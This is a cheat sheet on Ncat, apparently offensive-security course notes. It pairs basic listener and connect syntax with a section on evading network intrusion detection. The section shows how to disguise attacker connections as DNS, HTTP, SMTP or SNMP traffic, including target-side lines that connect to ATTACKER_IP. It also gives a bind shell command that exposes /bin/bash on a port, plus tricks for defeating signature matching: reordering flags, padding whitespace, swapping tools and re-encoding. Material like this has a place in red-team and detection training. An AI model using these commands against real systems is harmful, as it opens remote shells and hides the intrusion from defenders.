Ncat - networking utility which reads and writes data across networks
Source: https://nmap.org/ncat/

Usage:
  nc -lvnp PORT_NUM       To listen using TCP where port number is the port you want to listen to
  nc TARGET_IP PORT_NUM   To connect to an Ncat instance listening on a TCP port

Options:
  -l   Tells ncat to listen for incoming connections
  -v   Gets more verbose output as ncat binds to a source port and receives a connection
  -n   Avoids resolving hostnames
  -p   Specifies the port number that ncat will listen on
  -u   Listen using UDP

Network Security Evasion via Protocol Manipulation:
Rely on a Different Protocol:
  nc -ulvnp PORT_NUM        To listen using UDP where port number is the port you want to listen to
                            Note that unless you add -u, ncat will use TCP by default
  nc -u TARGET_IP PORT_NUM  To connect to an Ncat instance listening on a UDP port

Informational:
  Consider the following two examples:
    Running nc -lvnp 25 on the attacker system and connecting to it will give the impression that
    it is a usual TCP connection with an SMTP server, unless the IDS/IPS provides deep packet inspection (DPI).
    Executing nc -ulvnp 162 on the attacker machine and connecting to it will give the illusion
    that it is a regular UDP communication with an SNMP server unless the IDS/IPS supports DPI.

Manipulate (Source) TCP/UDP Port:
  nc -ulvnp 53           You can try to camouflage the traffic as if it is some DNS traffic to listen on UDP port `53`, as a DNS server would
  nc -u ATTACKER_IP 53   On the target, you can make it connect to the listening server
  nc -lvnp 80            Alternatively, you can make it appear more like web traffic where clients communicate with an HTTP server
  nc ATTACKER_IP 80      On the target, you can make it connect to the listening server

Modify the data:
  If you want to use Ncat to create a bind shell, the following command: `ncat -lvnp 1234 -e /bin/bash`
  tells ncat to listen on TCP port `1234` and bind Bash shell to it. If you want to detect packets containing
  such commands (wireshark), you need to think of something specific to match the signature but not too specific.
    - Scanning for ncat -lvnp can be easily evaded by changing the order of the flags.
    - Inspecting the payload for `ncat -` can be evaded by adding an extra white space, such as `ncat  -` which would still run correctly on the target system.
    - If the IDS is looking for `ncat`, then we need to consider more sophisticated approaches depending on the target system/application. 
    One option would be to use a different command such as nc socat. Alternatively, you can consider a different encoding if the target system can process it properly.
